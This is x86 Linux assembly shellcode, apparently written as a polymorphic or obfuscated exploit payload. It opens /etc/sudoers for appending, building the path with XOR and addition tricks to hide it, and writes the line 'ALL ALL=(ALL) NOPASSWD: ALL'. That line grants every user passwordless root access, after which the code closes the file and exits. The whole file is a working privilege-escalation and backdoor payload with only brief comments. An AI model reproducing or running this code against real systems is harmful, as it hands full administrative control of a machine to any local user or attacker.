section .text
	global _start

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor ecx, ecx
	mul ecx
	
	push eax
	
	push 0x7372656f		;8c8d9a90‬		; not 7372656f 
	
	;not dword [esp]
	
	push 0x4253510D		; 0x6475732f - 0x22222222
	add dword [esp], 0x22222222
	
	push 0x3621307A		;0x55555555 ^ 6374652f
	xor dword [esp], 0x55555555
	
	
	mov ebx, esp
	mov cx, 0x401
	mov al, 0x05
	int 0x80

	mov ebx, eax  

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	push edx
	
	sub esp, 28
	mov dword [esp]	  , 0x204c4c41
	mov dword [esp+4] , 0x3d4c4c41
	mov dword [esp+8] , 0x4c4c4128
	mov dword [esp+12], 0x4f4e2029
	mov dword [esp+16], 0x53534150
	mov dword [esp+20], 0x203a4457
	mov dword [esp+24], 0x0a4c4c41
	
	mov ecx, esp
	mov dl, 0x1c
	mov al, 0x04
	int 0x80

	;close(file)
	push 0x06
	pop eax
	int 0x80

	;exit(0);
	xor ebx, ebx
	mov al, 0x01
	int 0x80